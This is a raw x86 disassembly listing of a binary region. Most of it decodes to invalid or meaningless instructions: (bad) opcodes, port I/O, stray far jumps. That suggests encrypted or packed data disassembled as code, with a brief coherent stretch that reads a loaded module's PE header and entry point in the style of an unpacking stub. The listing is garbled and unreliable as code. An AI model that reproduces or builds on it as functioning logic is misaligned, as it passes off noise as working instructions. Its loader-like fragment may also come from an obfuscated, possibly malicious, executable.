  4187d1:	ins    BYTE PTR es:[edi],dx
  4187d2:	test   DWORD PTR [ebp+0x6f471e74],ebx
  4187d8:	add    al,0x67
  4187da:	push   0xfffffff3
  4187dc:	ds aaa 
  4187de:	popa   
  4187df:	in     al,0x8c
  4187e1:	leave  
  4187e2:	and    ah,BYTE PTR [esi]
  4187e4:	sbb    DWORD PTR [esi+0x34],ecx
  4187e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4187e8:	mov    DWORD PTR [ebx+0x68c181a9],0x8bffcd8d
  4187f2:	icebp  
  4187f3:	xor    esi,eax
  4187f5:	add    esi,DWORD PTR [ebp+0x8]
  4187f8:	mov    DWORD PTR [ebp+0x8],esi
  4187fb:	mov    esi,DWORD PTR [ebp+0x8]
  4187fe:	xor    esi,ecx
  418800:	xor    esi,eax
  418802:	mov    eax,DWORD PTR [edx+0x194]
  418808:	mov    ecx,DWORD PTR [eax]
  41880a:	mov    eax,DWORD PTR [ecx+0x3c]
  41880d:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  418811:	add    eax,ecx
  418813:	mov    DWORD PTR [ebp+0x8],esi
  418816:	mov    DWORD PTR [ebp+0x10],eax
  418819:	mov    eax,DWORD PTR [ebp+0x10]
  41881c:	pop    esi
  41881d:	test   eax,eax
  41881f:	je     0x419191
  418825:	push   DWORD PTR ds:0x41ebbe
  41882b:	jmp    0x418b45
  418830:	cmp    eax,0xcbd3c4c6
  418835:	rcl    ebp,1
  418837:	fcmove st,st(3)
  418839:	test   eax,0x95c11af2
  41883e:	inc    esp
  41883f:	enter  0x3e17,0x7f
  418843:	js     0x4188c0
  418845:	jle    0x4188bf
  418847:	js     0x418802
  418849:	and    DWORD PTR [esi],0xff40bc46
  41884f:	xchg   edx,eax
  418850:	push   ss
  418851:	gs sahf 
  418853:	out    0xb,al
  418855:	enter  0xe48d,0x11
  418859:	rol    BYTE PTR [edi-0x54],1
  41885c:	xchg   ebx,eax
  41885d:	fnstsw WORD PTR [esi-0x44]
  418860:	test   eax,0xb5c4b347
  418865:	mov    eax,0xd18956e7
  41886a:	stc    
  41886b:	in     al,0x85
  41886d:	ror    BYTE PTR [esi+0x62],1
  418870:	jmp    0x9050d445
  418875:	sub    al,0x53
  418877:	adc    BYTE PTR [ecx+0x1c],ch
  41887a:	cli    
  41887b:	push   edi
  41887c:	hlt    
  41887d:	mov    bl,0x73
  41887f:	adc    bh,BYTE PTR [ebx+0x1a49c8e0]
  418885:	mov    edx,0x7d165e35
  41888a:	jg     0x4188e1
  41888c:	dec    eax
  41888d:	mov    ds:0x47f79866,al
  418892:	xor    BYTE PTR ds:[ebx-0x7],bh
  418896:	jbe    0x418897
  418898:	scas   eax,DWORD PTR es:[edi]
  418899:	xchg   esp,eax
  41889a:	xor    ebx,DWORD PTR [eax+0x5e]
  41889d:	jmp    0x437134b5
  4188a2:	rcr    DWORD PTR [ecx+eax*2+0x4b],1
  4188a6:	jge    0x4188ed
  4188a8:	lods   al,BYTE PTR ds:[esi]
  4188a9:	aas    
  4188aa:	or     esi,ebp
  4188ac:	mov    bh,BYTE PTR [ecx+0x73816d71]
  4188b2:	loope  0x418902
  4188b4:	aam    0x2
  4188b6:	pop    ebp
  4188b7:	in     eax,0xfd
  4188b9:	mov    dh,dh
  4188bb:	cmp    eax,0xfa3f44d4
  4188c0:	or     BYTE PTR [ecx-0xd],dh
  4188c3:	and    DWORD PTR ds:0x409379a,ecx
  4188c9:	dec    eax
  4188ca:	scas   al,BYTE PTR es:[edi]
  4188cb:	jnp    0x418917
  4188cd:	cmp    ah,BYTE PTR [ebp-0x39419683]
  4188d3:	call   0x2362:0x862122a1
  4188da:	add    edx,DWORD PTR [ecx+0x38]
  4188dd:	in     al,dx
  4188de:	ret    0x40c8
  4188e1:	icebp  
  4188e2:	pop    ebp
  4188e3:	rcr    DWORD PTR [eax+esi*2+0x22],1
  4188e7:	ffree  st(6)
  4188e9:	or     al,0x56
  4188eb:	jmp    0x4188f6
  4188ed:	cmc    
  4188ee:	cmp    ecx,esp
  4188f0:	test   eax,0xcf95d3a5
  4188f5:	stc    
  4188f6:	lds    edi,FWORD PTR [ebx+0x60b10964]
  4188fc:	aam    0x49
  4188fe:	aas    
  4188ff:	pop    ds
  418900:	outs   dx,DWORD PTR ds:[esi]
  418901:	fild   DWORD PTR [edx]
  418903:	xchg   esp,eax
  418904:	adc    DWORD PTR [ecx-0x6802d5f5],ebp
  41890a:	pop    ss
  41890b:	sbb    bl,BYTE PTR [esi+edi*8]
  41890e:	push   0x8a1da5b4
  418913:	cdq    
  418914:	adc    al,0xe
  418916:	ins    DWORD PTR es:[edi],dx
  418917:	mov    ds:0xe0f3f28a,al
  41891c:	rcl    ebx,1
  41891e:	mov    dl,0x8c
  418920:	daa    
  418921:	outs   dx,DWORD PTR ds:[esi]
  418922:	clc    
  418923:	mov    esi,0xa2464b33
  418928:	add    esi,esp
  41892a:	leave  
  41892b:	jl     0x41895a
  41892d:	mov    bh,BYTE PTR [edx-0x58608de3]
  418933:	rol    dl,0xf7
  418936:	pop    ecx
  418937:	mov    ecx,0x6bc6fb1f
  41893c:	mov    edx,0xf9208ac2
  418941:	mov    ch,cl
  418943:	push   ss
  418944:	push   ds
  418945:	inc    ebx
  418946:	push   ebp
  418947:	dec    ebx
  418948:	fcmovnu st,st(7)
  41894a:	xchg   edi,eax
  41894b:	xchg   ebp,eax
  41894c:	or     esp,DWORD PTR [ecx-0x3a8a70a]
  418952:	std    
  418953:	outs   dx,DWORD PTR ds:[esi]
  418954:	jnp    0x41897a
  418956:	test   al,0x6e
  418958:	xor    ah,dh
  41895a:	outs   dx,BYTE PTR ds:[esi]
  41895b:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  41895d:	enter  0xa4f5,0xa0
  418961:	push   cs
  418962:	or     eax,0xcb71ed7e
  418967:	push   es
  418968:	or     BYTE PTR [esi-0x31],dl
  41896b:	pop    ds
  41896c:	mov    dh,0xe2
  41896e:	xchg   ebp,eax
  41896f:	pop    ecx
  418970:	iret   
  418971:	sub    edx,eax
  418973:	fld    DWORD PTR [ebx-0x46]
  418976:	mov    ch,0xbd
  418978:	and    eax,0x9f4fa475
  41897d:	aad    0x23
  41897f:	mov    WORD PTR [edi],es
  418981:	je     0x418947
  418983:	rcr    cl,1
  418985:	or     DWORD PTR [eax],edx
  418987:	rol    BYTE PTR [edx+0x3631f331],cl
  41898d:	cmp    cl,BYTE PTR [ecx-0x22]
  418990:	ja     0x418995
  418992:	mov    dh,0xe5
  418994:	inc    ebx
  418995:	nop
  418996:	xor    ebx,DWORD PTR [edi+0x20]
  418999:	call   DWORD PTR [eax-0x4f229162]
  41899f:	test   DWORD PTR [ebx],esi
  4189a1:	dec    edi
  4189a2:	push   ebx
  4189a3:	mov    esi,0x1f5e456b
  4189a8:	ds dec eax
  4189aa:	outs   dx,DWORD PTR ds:[esi]
  4189ab:	fstp   TBYTE PTR [edi+0x37014edf]
  4189b1:	adc    al,0xc0
  4189b3:	xchg   ebp,esp
  4189b5:	mov    cl,dl
  4189b7:	les    ecx,FWORD PTR [edi+0x70]
  4189ba:	enter  0x3cc1,0x24
  4189be:	push   0x17
  4189c0:	lods   al,BYTE PTR ds:[esi]
  4189c1:	je     0x418a17
  4189c3:	fisttp QWORD PTR [edx+0x79]
  4189c6:	outs   dx,DWORD PTR ds:[esi]
  4189c7:	icebp  
  4189c8:	shl    BYTE PTR [eax+0x693f5e0],cl
  4189ce:	sub    DWORD PTR [edi+0x26fb5e5],ecx
  4189d4:	bound  ebp,QWORD PTR [edi-0xf]
  4189d7:	fistp  DWORD PTR [ecx]
  4189d9:	outs   dx,BYTE PTR ds:[esi]
  4189da:	xchg   ebx,eax
  4189db:	mov    edi,0x1b29125d
  4189e0:	push   0xffffffb9
  4189e2:	(bad)  
  4189e3:	dec    esi
  4189e4:	mov    cl,0x7
  4189e6:	clc    
  4189e7:	inc    esp
  4189e8:	add    eax,0xa5ad57d5
  4189ed:	or     ebp,DWORD PTR [edi+eax*1]
  4189f0:	inc    eax
  4189f1:	jnp    0x4189cd
  4189f3:	jo     0x418a3b
  4189f5:	and    al,0x4a
  4189f7:	add    eax,0xcbbc01bc
  4189fc:	add    al,0xc8
  4189fe:	inc    ecx
  4189ff:	inc    ebp
  418a00:	adc    dl,cl
  418a02:	fsubr  DWORD PTR ds:0x4e37261b
  418a08:	jnp    0x41899d
  418a0a:	push   eax
  418a0b:	and    al,0x35
  418a0d:	fbld   TBYTE PTR [ebx-0x60]
  418a10:	call   0x320f:0xb53f5d98
  418a17:	(bad)  
  418a18:	jg     0x4189b1
  418a1a:	inc    edx
  418a1b:	scas   al,BYTE PTR es:[edi]
  418a1c:	or     DWORD PTR [edi],ebp
  418a1e:	out    0xc6,eax
  418a20:	imul   ebp,DWORD PTR [ecx],0xd1739cfa
  418a26:	sub    DWORD PTR [ecx-0x680cd261],0x14ffd1a5
  418a30:	es stos BYTE PTR es:[edi],al
  418a32:	loope  0x418a9e
  418a34:	push   edx
  418a35:	test   DWORD PTR [eax+esi*4+0x3132f59a],ebp
  418a3c:	xor    ah,BYTE PTR [eax]
  418a3e:	jbe    0x418a59
  418a40:	mov    edx,0xaa9f2d98
  418a45:	mov    ah,0x5c
  418a47:	popa   
  418a48:	dec    edi
  418a49:	add    edi,ebx
  418a4b:	neg    dl
  418a4d:	inc    ebx
  418a4e:	inc    edx
  418a4f:	cmp    al,0x33
  418a51:	jle    0x418a23
  418a53:	fs dec edx
  418a55:	sti    
  418a56:	sbb    al,0x20
  418a58:	adc    BYTE PTR [edi+0x11155f33],bl
  418a5e:	sub    eax,0x4206928f
  418a63:	repnz leave 
  418a65:	sbb    DWORD PTR [ecx+0x4d0dd636],ebp
  418a6b:	add    eax,0x122c901e
  418a70:	int    0xad
  418a72:	sub    BYTE PTR [ecx+0x23f7e80],ah
  418a78:	fidivr WORD PTR [eax+0x44]
  418a7b:	push   ebp
  418a7c:	adc    al,0x2b
  418a7e:	pop    es
  418a7f:	lods   eax,DWORD PTR ds:[esi]
  418a80:	cmp    DWORD PTR [edx-0x40403056],ebp
  418a86:	(bad)  [ebp+0x52]
  418a89:	fsub   QWORD PTR ds:0xbcbdd096
  418a8f:	sbb    DWORD PTR [edi+0x1c38d994],ebx
  418a95:	sub    eax,0x42f80059
  418a9a:	lods   eax,DWORD PTR ds:[esi]
  418a9b:	mov    ?,WORD PTR [edx-0x22e575fc]
  418aa1:	das    
  418aa2:	daa    
  418aa3:	xor    DWORD PTR ds:0xbb904a2e,edx
  418aa9:	mov    ch,al
  418aab:	or     ah,ah
  418aad:	fdivr  st(6),st
  418aaf:	mov    ah,0x81
  418ab1:	jge    0x418b28
  418ab3:	jmp    0x3f6:0x3796abd
  418aba:	shl    dh,cl
  418abc:	aas    
  418abd:	test   DWORD PTR [edi-0x30c801e4],ebp
  418ac3:	push   ecx
  418ac4:	mov    es,WORD PTR [edi+0x5c3cd649]
  418aca:	mov    DWORD PTR [eax],ebx
  418acc:	mov    ecx,0xa4eae3bc
  418ad1:	cwde   
  418ad2:	sbb    eax,0x480df54b
  418ad7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418ad8:	or     DWORD PTR [ecx+ebp*4],edi
  418adb:	retf   0x4d8a
  418ade:	xlat   BYTE PTR ds:[ebx]
  418adf:	fcomp  QWORD PTR [esi]
  418ae1:	(bad)
  418ae5:	jg     0x418a7a
  418ae7:	sub    DWORD PTR [esi-0x35],edx
  418aea:	fld    DWORD PTR [edi]
  418aec:	lahf   
  418aed:	push   0xffffffc3
  418aef:	retf   0x1502
  418af2:	fistp  DWORD PTR [esi]
  418af4:	test   al,0x16
  418af6:	ja     0x418aa5
  418af8:	dec    edi
  418af9:	pop    ds
  418afa:	mov    dl,0xf8
  418afc:	data16 jns 0x418aa7
  418aff:	mov    al,0xdc
  418b01:	pop    ds
  418b02:	dec    esp
  418b03:	jb     0x418ad2
  418b05:	mov    bh,0xb4
  418b07:	jecxz  0x418afa
  418b09:	and    ch,ch
  418b0b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418b0c:	out    dx,al
  418b0d:	jns    0x418a98
  418b0f:	into   
  418b10:	cmp    BYTE PTR [ebp+ebx*2+0x7888eb8f],ch
  418b17:	nop
  418b18:	iret   
  418b19:	push   ebp
  418b1a:	mov    WORD PTR [edi+0x744d8f5a],?
  418b20:	cmp    ebp,DWORD PTR [edi]
  418b22:	or     BYTE PTR [ebx-0x20],ah
  418b25:	xchg   edx,eax
  418b26:	(bad)  
  418b27:	(bad)  
  418b28:	mov    dl,0xfa
  418b2a:	rcl    BYTE PTR [edi],cl
  418b2c:	push   esi
  418b2d:	push   esi
  418b2e:	mov    dh,0x5d
  418b30:	ret    
  418b31:	or     BYTE PTR [esi+0x50],cl
  418b34:	and    ah,BYTE PTR [eax+esi*8]
  418b37:	push   ecx
  418b38:	int    0x89
  418b3a:	add    eax,0xc42f7e6e
  418b3f:	ret    
  418b40:	aas    
  418b41:	rol    DWORD PTR [esi+0x35ff0210],cl
  418b47:	push   0xffffffe9
  418b49:	inc    ecx
  418b4a:	add    BYTE PTR [ebx+0x19482],cl
  418b50:	add    cl,ch
  418b52:	adc    eax,0xcb000003
  418b57:	into   
  418b58:	ret    
  418b59:	ret    
  418b5a:	(bad)  
  418b5c:	retf   
  418b5d:	(bad)  
  418b5e:	xor    dh,cl
  418b60:	stos   DWORD PTR es:[edi],eax
  418b61:	push   eax
  418b62:	and    ecx,edi
  418b64:	repz sahf 
  418b66:	adc    al,bl
  418b68:	jg     0x418be2
  418b6a:	jnp    0x418bea
  418b6c:	js     0x418be6
  418b6e:	mov    ecx,0x2fdb15a8
  418b73:	pop    edx
  418b74:	push   ebx
  418b75:	out    0xa7,eax
  418b77:	in     eax,dx
  418b78:	inc    edx
  418b79:	jbe    0x418bac
  418b7b:	inc    eax
  418b7c:	cmp    BYTE PTR [eax-0x1f92b8b1],0x83
  418b83:	ss jo  0x418b86
  418b86:	sub    DWORD PTR [edi+eax*8],esp
  418b89:	fidivr DWORD PTR [edi]
  418b8b:	xchg   ecx,eax
  418b8c:	mov    cs,WORD PTR [eax-0x39d000a8]
  418b92:	call   0x9cbf8a7a
  418b97:	push   ebp
  418b98:	rcl    BYTE PTR [ebx+esi*4+0xb8e90dc],0x1
  418ba0:	addr16 test ax,0x267c
  418ba5:	(bad)  
  418ba7:	(bad)  
  418ba8:	fisttp DWORD PTR [ecx+0x66]
  418bab:	inc    ebx
  418bac:	lds    esp,FWORD PTR ds:0xaa4ded07
  418bb2:	xchg   BYTE PTR [edi],cl
  418bb4:	mov    DWORD PTR [edx+ebx*1],ebx
  418bb7:	rcl    BYTE PTR [edi],1
  418bb9:	push   ebx
  418bba:	mov    al,0x34
  418bbc:	into   
  418bbd:	(bad)  
  418bbe:	mov    edi,0x3fcacd3
  418bc3:	gs out dx,al
  418bc5:	(bad)  
  418bc6:	xor    DWORD PTR [ebx],esp
  418bc8:	xchg   ebp,eax
  418bc9:	or     ch,bh
  418bcb:	cmp    BYTE PTR ds:0xedaabda2,bl
  418bd1:	bound  esp,QWORD PTR [esi-0x357dea61]
  418bd7:	cld    
  418bd8:	fwait
  418bd9:	js     0x418bfe
  418bdb:	neg    DWORD PTR [eax]
  418bdd:	retf   
  418bde:	xor    BYTE PTR [ebp-0x689bd4d0],dh
  418be4:	stc    
  418be5:	mov    ebp,DWORD PTR [eax]
  418be7:	adc    esp,DWORD PTR [esi+0x4c]
  418bea:	outs   dx,DWORD PTR ds:[si]
  418bec:	rcl    BYTE PTR [ecx-0x67e8afa6],cl
  418bf2:	push   ds
  418bf3:	loope  0x418c11
  418bf5:	push   cs
  418bf6:	sub    al,0x9a
  418bf8:	fimul  WORD PTR [ebx-0x73]
  418bfb:	inc    esi
  418bfc:	aaa    
  418bfd:	xchg   ebp,eax
  418bfe:	rol    BYTE PTR [ebx-0x71],cl
  418c01:	inc    esp
  418c02:	or     al,0xe6
  418c04:	add    ebx,DWORD PTR [esi]
  418c06:	inc    eax
  418c07:	pop    ds
  418c08:	pushf  
  418c09:	add    BYTE PTR [ebp+0x5c9b801b],bh
  418c0f:	outs   dx,BYTE PTR ds:[esi]
  418c10:	stos   BYTE PTR es:[edi],al
  418c11:	clc    
  418c12:	popa   
  418c13:	lahf   
  418c14:	test   eax,0xb304a16
  418c19:	pushf  
  418c1a:	add    al,0x4
  418c1c:	mov    eax,ds:0xec50965d
  418c21:	(bad)  
  418c22:	ja     0x418c82
  418c24:	shl    DWORD PTR ds:[edi+0x0],1
  418c28:	or     BYTE PTR [edx+0x0],0xf5
  418c2c:	scas   al,BYTE PTR es:[edi]
  418c2d:	test   cl,0xc0
  418c30:	(bad)
  418c34:	aam    0xae
  418c36:	mov    al,ds:0x80eb0c00
  418c3b:	xchg   esp,eax
  418c3c:	ret    0xb741
  418c3f:	adc    ah,BYTE PTR [edi-0x68d991b2]
  418c45:	loop   0x418c84
  418c47:	push   ebp
  418c48:	mov    ebx,DWORD PTR [ebp-0x41]
  418c4b:	loope  0x418c15
  418c4d:	mov    bh,0x95
  418c4f:	(bad)  
  418c50:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418c51:	popf   
  418c52:	retf   0xa985
  418c55:	cli    
  418c56:	outs   dx,BYTE PTR ds:[esi]
  418c57:	div    DWORD PTR [ebx]
  418c59:	xchg   BYTE PTR [ebp-0x2fcdb378],al
  418c5f:	fwait
  418c60:	mov    eax,DWORD PTR [esi+0x1ef8cf02]
  418c66:	pop    es
  418c67:	xor    DWORD PTR [ecx],ecx
  418c69:	cwde   
  418c6a:	push   es
  418c6b:	mov    al,ds:0xedcb2585
  418c70:	sar    dl,cl
  418c72:	adc    BYTE PTR [esi],0x45
  418c75:	(bad)
  418c78:	xor    DWORD PTR [esi+0x3b],esp
  418c7b:	(bad)  
  418c7c:	adc    eax,0xa145a92e
  418c81:	pop    edi
  418c82:	out    dx,al
  418c83:	test   al,0x64
  418c85:	push   ecx
  418c86:	xchg   esp,eax
  418c87:	pop    ds
  418c88:	sbb    eax,0xfa59c77
  418c8d:	ror    eax,cl
  418c8f:	push   esp
  418c90:	stos   DWORD PTR es:[edi],eax
  418c91:	shl    BYTE PTR [esi+0x7d],cl
  418c94:	sti    
  418c95:	mov    esp,0xd6050e6b
  418c9a:	and    al,0xa3
  418c9c:	dec    eax
  418c9d:	cmc    
  418c9e:	jge    0x418c92
  418ca0:	daa    
  418ca1:	lods   al,BYTE PTR ds:[esi]
  418ca2:	pusha  
  418ca3:	cld    
  418ca4:	fld    DWORD PTR [ebp-0xec7985a]
  418caa:	or     BYTE PTR [edi-0x32b1310a],bh
  418cb0:	pop    bx
  418cb2:	sbb    DWORD PTR [eax],edx
  418cb4:	ror    DWORD PTR [edi+0x3e],cl
  418cb7:	cld    
  418cb8:	cmc    
  418cb9:	fdiv   QWORD PTR [ebp-0xa94f266]
  418cbf:	jnp    0x418d17
  418cc1:	retf   0x355a
  418cc4:	retf   0x2c51
  418cc7:	jb     0x418c83
  418cc9:	test   DWORD PTR ds:0xe68a6d75,ebp
  418ccf:	inc    ebp
  418cd0:	sub    eax,0x3d44720b
  418cd5:	cmc    
  418cd6:	adc    esi,esp
  418cd8:	adc    cl,BYTE PTR [edi+0x725a1e7c]
  418cde:	sahf   
  418cdf:	adc    DWORD PTR [eax],esp
  418ce1:	mov    ecx,0x68dfe492
  418ce6:	fisttp WORD PTR [esi-0x62]
  418ce9:	aad    0x24
  418ceb:	bound  esp,QWORD PTR [ebx]
  418ced:	mov    ch,0x55
  418cef:	mov    bh,0xa5
  418cf1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418cf2:	mov    bl,BYTE PTR [edx]
  418cf4:	ins    BYTE PTR es:[edi],dx
  418cf5:	stc    
  418cf6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418cf7:	xor    cl,al
  418cf9:	lock dec edi
  418cfb:	lahf   
  418cfc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418cfd:	cmp    ecx,esp
  418cff:	adc    DWORD PTR [ebx+0x7c767364],eax
  418d05:	sbb    eax,0xe562f358
  418d0a:	pop    ss
  418d0b:	inc    ebp
  418d0c:	mov    edi,0x202f03b1
  418d11:	and    al,0xba
  418d13:	loop   0x418c95
  418d15:	test   al,0x6f
  418d17:	sbb    bh,ch
  418d19:	cmc    
  418d1a:	fwait
  418d1b:	xchg   edx,eax
  418d1c:	jns    0x418cb6
  418d1e:	std    
  418d1f:	inc    edi
  418d20:	bnd jmp 0x418cad
  418d23:	fadd   DWORD PTR [eax-0x1ad353f4]
  418d29:	lods   al,BYTE PTR ds:[esi]
  418d2a:	mov    bh,0x7
  418d2c:	fs cli 
  418d2e:	and    ch,BYTE PTR [ecx]
  418d30:	ss dec ebx
  418d32:	mov    ebx,0xb39c229
  418d37:	and    edi,DWORD PTR [esi+0x5048f90]
  418d3d:	sub    eax,0x45
  418d40:	mov    esi,0xab6a0119
  418d45:	mov    BYTE PTR [edx-0x1a8df5f3],dh
  418d4b:	xchg   ebp,eax
  418d4c:	pop    ecx
  418d4d:	test   al,0xee
  418d4f:	jp     0x418daf
  418d51:	imul   ebp,DWORD PTR [ecx],0xffffffa8
  418d54:	mov    cl,al
  418d56:	lods   eax,DWORD PTR ds:[esi]
  418d57:	scas   al,BYTE PTR es:[edi]
  418d58:	jno    0x418d9f
  418d5a:	test   al,0xd5
  418d5c:	retf   0xa8f2
  418d5f:	jae    0x418dc1
  418d61:	mov    cl,0xb7
  418d63:	out    dx,al
  418d64:	add    DWORD PTR [edx],ebx
  418d66:	(bad)  
  418d68:	mov    esi,0x55323cb9
  418d6d:	stos   BYTE PTR es:[edi],al
  418d6e:	mov    esi,0xf3bcfe8c
  418d73:	loope  0x418d3d
  418d75:	lods   eax,DWORD PTR ds:[esi]
  418d76:	dec    ecx
  418d77:	out    dx,al
  418d78:	pop    ds
  418d79:	xor    DWORD PTR [edx+0x2aed3ee9],ebp
  418d7f:	sbb    ah,bl
  418d81:	stos   BYTE PTR es:[edi],al
  418d82:	bound  ecx,QWORD PTR ds:[edi]
  418d85:	out    dx,eax
  418d86:	pusha  
  418d87:	nop
  418d88:	mov    esp,0xffc75385
  418d8d:	pop    edi
  418d8e:	jmp    0x418d4c
  418d90:	cmp    DWORD PTR [esi+0x4573bb6e],esp
  418d96:	mov    ecx,gs
  418d98:	lahf   
  418d99:	das    
  418d9a:	sbb    edi,esi
  418d9c:	cmp    eax,0x3619d466
  418da1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418da2:	pop    gs
  418da4:	mov    WORD PTR [edx+eiz*1-0x5941d751],fs
  418dab:	mov    ebp,0x640d5ca8
  418db0:	add    BYTE PTR [esi-0x71cac7b5],dh
  418db6:	pop    ebx
  418db7:	ins    DWORD PTR es:[edi],dx
  418db8:	mov    ds:0xc5966e82,eax
  418dbd:	mov    eax,ds:0x3f345a69
  418dc2:	adc    DWORD PTR [esi+0x7f15722],ebp
  418dc8:	cmp    al,0x75
  418dca:	adc    DWORD PTR [ecx],0xffffff96
  418dcd:	xchg   edi,eax
  418dce:	or     DWORD PTR [ecx-0x3d],0x56da40b2
  418dd5:	sbb    al,0x30
  418dd7:	pop    ss
  418dd8:	bound  ebx,QWORD PTR [edi]
  418dda:	mov    ds:0x4f8a2e40,eax
  418ddf:	scas   eax,DWORD PTR es:[edi]
  418de0:	and    al,0x0
  418de2:	imul   ebp,DWORD PTR [esi],0xffffffc6
  418de5:	jp     0x418de3
  418de7:	(bad)  
  418de8:	(bad)  
  418dea:	xchg   esi,eax
  418deb:	ror    DWORD PTR [esi],1
  418ded:	push   ebp
  418dee:	mov    dh,0x44
  418df0:	pop    edx
  418df1:	mov    ah,0x2c
  418df3:	adc    BYTE PTR [edi-0x7b3648ce],cl
  418df9:	pop    ebx
  418dfa:	imul   ecx,DWORD PTR [edx],0x24
  418dfd:	out    0xfc,ax
  418e00:	jmp    0x4bff:0xfaabd911
  418e07:	sub    DWORD PTR [ebx-0x1b65c55e],ebp
  418e0d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418e0e:	shl    esp,cl
  418e10:	add    BYTE PTR [eax-0x17],ch
  418e13:	lea    edx,[ebx+edi*1]
  418e16:	or     eax,0x2a27aac7
  418e1b:	loopne 0x418e8f
  418e1d:	sub    cl,BYTE PTR [esi-0x2e]
  418e20:	pop    ebp
  418e21:	pop    esi
  418e22:	ins    DWORD PTR es:[edi],dx
  418e23:	stc    
  418e24:	xor    eax,0xa5ca65
  418e29:	pusha  
  418e2a:	data16 fcomp DWORD PTR [edi-0x2e]
  418e2e:	fcomp  DWORD PTR [ebp-0x6f]
  418e31:	popf   
  418e32:	int3   
  418e33:	adc    BYTE PTR [ecx-0x41a9cefd],dh
  418e39:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418e3a:	retf   
  418e3b:	aad    0x1b
  418e3d:	hlt    
  418e3e:	int3   
  418e3f:	jbe    0x418eae
  418e41:	xchg   edi,eax
  418e42:	jbe    0x418ebf
  418e44:	push   es
  418e45:	lea    esp,[edi+0x6a]
  418e48:	sub    ebp,ecx
  418e4a:	push   0x99497eb8
  418e4f:	test   al,0x5c
  418e51:	mov    esi,0xd1e27e4b
  418e56:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e57:	stc    
  418e58:	fwait
  418e59:	cmp    BYTE PTR [ebx-0x653d61b9],cl
  418e5f:	add    dl,BYTE PTR [edx+eiz*8+0x333bd566]
  418e66:	cmp    al,0x5a
  418e68:	out    dx,al
  418e69:	cld    
  418e6a:	popa   
  418e6b:	push   DWORD PTR [eax]
  418e6d:	mov    eax,DWORD PTR [ebp+0x10]
  418e70:	jmp    0x41918a
  418e75:	retf   
  418e76:	rol    dl,cl
  418e78:	(bad)  
  418e79:	(bad)  
  418e7b:	leave  
  418e7c:	shl    DWORD PTR [esi+0x11],1
  418e7f:	(bad)  
  418e81:	std    
  418e82:	popa   
  418e83:	cmp    al,BYTE PTR [edi+0x787fc00d]
  418e89:	jnp    0x418f09
  418e8b:	js     0x418f05
  418e8d:	pusha  
  418e8e:	dec    edx
  418e8f:	push   es
  418e90:	sbb    BYTE PTR [esi],ah
  418e92:	scas   eax,DWORD PTR es:[edi]
  418e93:	jmp    0x418e69
  418e95:	add    al,0x8c
  418e97:	jmp    0xc4352e78
  418e9c:	fistp  WORD PTR ds:0x363fbbe9
  418ea2:	adc    eax,DWORD PTR [eax-0x7352ebaf]
  418ea8:	jmp    0xc8e8:0x844b53dc
  418eaf:	inc    ebx
  418eb0:	in     eax,dx
  418eb1:	inc    ecx
  418eb2:	mov    bh,0xca
  418eb4:	and    DWORD PTR [ebx],esi
  418eb6:	sbb    ch,dh
  418eb8:	mul    esi
  418eba:	xor    al,0xee
  418ebc:	mov    dh,0xf0
  418ebe:	inc    esi
  418ebf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418ec0:	ins    BYTE PTR es:[edi],dx
  418ec1:	sbb    dh,BYTE PTR ds:0x3dc153e4
  418ec7:	cmp    al,0x62
  418ec9:	fstp   QWORD PTR [ecx]
  418ecb:	mov    BYTE PTR [esi-0xce0719d],al
  418ed1:	inc    ebp
  418ed2:	repz scas eax,DWORD PTR es:[edi]
  418ed4:	(bad)  
  418ed5:	xchg   esi,eax
  418ed6:	shr    ah,cl
  418ed8:	enter  0x3a6d,0xf2
  418edc:	loopne 0x418e77
  418ede:	lods   eax,DWORD PTR ds:[esi]
  418edf:	arpl   WORD PTR [esi-0x68],bx
  418ee2:	ins    BYTE PTR es:[edi],dx
  418ee3:	sbb    DWORD PTR [ebp+eiz*2-0x80],esp
  418ee7:	xchg   ebp,eax
  418ee8:	dec    esp
  418ee9:	mov    al,ds:0xa06bb273
  418eee:	push   cs
  418eef:	popf   
  418ef0:	jbe    0x418e99
  418ef2:	jns    0x418e80
  418ef4:	scas   al,BYTE PTR es:[edi]
  418ef5:	mov    ebp,ss
  418ef7:	lds    ebp,FWORD PTR [esi-0x2278045c]
  418efd:	ss into 
  418eff:	add    al,0xd
  418f01:	mov    eax,ds:0x6a71247a
  418f06:	jp     0x418f14
  418f08:	mov    cl,0xf4
  418f0a:	jae    0x418f43
  418f0c:	loop   0x418f34
  418f0e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418f0f:	ret    0x92e3
  418f12:	(bad)  
  418f13:	lahf   
  418f14:	inc    eax
  418f15:	(bad)  
  418f16:	adc    BYTE PTR [edi+0x36],ah
  418f19:	add    al,0x32
  418f1b:	sbb    BYTE PTR [edi],bl
  418f1d:	pop    ebx
  418f1e:	xchg   edi,eax
  418f1f:	mov    ebx,0xba924ddb
  418f24:	ret    
  418f25:	es jb  0x418ece
  418f28:	in     eax,0x94
  418f2a:	int    0xb0
  418f2c:	dec    eax
  418f2d:	(bad)  
  418f2e:	pop    ss
  418f2f:	cld    
  418f30:	cmp    al,0x4a
  418f32:	icebp  
  418f33:	std    
  418f34:	pop    eax
  418f35:	ror    DWORD PTR [eax+esi*8-0x570a1d9b],cl
  418f3c:	or     DWORD PTR [eax],ecx
  418f3e:	arpl   sp,bp
  418f40:	repnz aad 0xd9
  418f43:	(bad)  
  418f45:	paddd  mm5,QWORD PTR cs:[edi]
  418f49:	push   0xffffff82
  418f4b:	pop    edi
  418f4c:	push   ds
  418f4d:	aad    0xe6
  418f4f:	fs or  eax,0xf77eb9a9
  418f55:	int    0x81
  418f57:	retf   0x62e5
  418f5a:	cli    
  418f5b:	or     eax,0xbb7dbbe6
  418f60:	out    0x3b,al
  418f62:	pop    ds
